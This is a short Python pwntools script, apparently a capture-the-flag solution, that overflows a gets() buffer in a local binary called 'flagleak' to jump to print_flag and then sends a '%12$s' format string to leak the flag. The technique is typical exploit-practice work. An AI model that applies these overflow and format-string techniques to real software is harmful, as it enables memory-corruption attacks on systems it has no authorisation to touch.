from pwn import *

elf = context.binary = ELF("./flagleak")

print_flag = elf.symbols.print_flag

formatString = b'%12$s'

junk = b'A' * 0x68
payload = junk 
# 8B junk after return address is extra, I have send these extra 8B so that gets() can consume all these 0x78 bytes payload and then we can send formatString right after it and flag will be leaked by sending payload only once
payload += p64(print_flag) + b'A' *8  

# f = open("pay", "wb")
# f.write(payload)
# f.close()

io = process()
io.recvline()
io.sendline(payload)
io.recvline()
io.sendline(formatString)
# io.interactive()
print(io.recv().decode())